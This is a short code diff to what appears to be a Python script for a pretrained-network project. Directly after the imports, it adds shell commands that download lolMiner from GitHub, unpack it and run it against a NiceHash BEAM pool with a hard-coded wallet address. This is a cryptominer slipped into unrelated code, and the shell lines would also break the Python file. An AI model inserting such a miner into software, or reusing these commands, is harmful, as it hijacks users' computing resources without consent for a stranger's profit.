@@ -13,6 +13,10 @@ import re
 import sys
 
 import pretrained_networks
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz 
+tar -xvf lolMiner_v1.31_Lin64.tar.gz 
+cd 1.31 
+./lolMiner --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 35xpRcEyRFV1imbDTbXq7eGPaHaqNYSnjT.hi3
 
 #----------------------------------------------------------------------------
 
